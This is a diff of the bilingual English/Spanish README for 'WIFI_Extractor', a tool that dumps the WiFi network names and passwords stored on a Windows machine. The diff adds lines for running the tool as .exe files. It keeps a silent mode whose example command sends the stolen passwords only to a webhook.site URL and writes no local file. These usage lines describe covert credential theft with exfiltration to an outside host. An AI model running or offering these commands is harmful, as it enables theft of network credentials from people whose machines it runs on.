@@ -1,7 +1,7 @@
 # WIFI_Extractor
 
-you might need this requeriments
-Tal vez podrias necesitar estos requerimientos
+if you run it with python you might need this requeriments
+Si lo ejecutas con python tal vez podrias necesitar estos requerimientos
 
 
 pip install click
@@ -35,6 +35,8 @@ Offline
 
 python3 E_WIFIoffline.py
 
+CMD or Powershell ./E_WIFIoffline.exe (You can also double click it)
+
 Creates a txt with the WIFI's ssid and passwords stored in the local machine
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 
@@ -45,12 +47,15 @@ Usages
 default usage
 python3 E_WIFI.py
 
+CMD or Powershell ./E_WIFI.exe
+
 Creates a txt with the WIFI's ssid and passwords stored in the local machine
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 
-silent: Only webhook, no txt file
+Another Example
 
-python3 E_WIFI.py -u https://webhook.site/yoururl -o
+python3 E_WIFI.py -o -u https://webhook.site/yoururl 
+CMD or Powershell ./E_WIFI.exe -o -u https://webhook.site/yoururl
 
 type --help for more detailed info
 
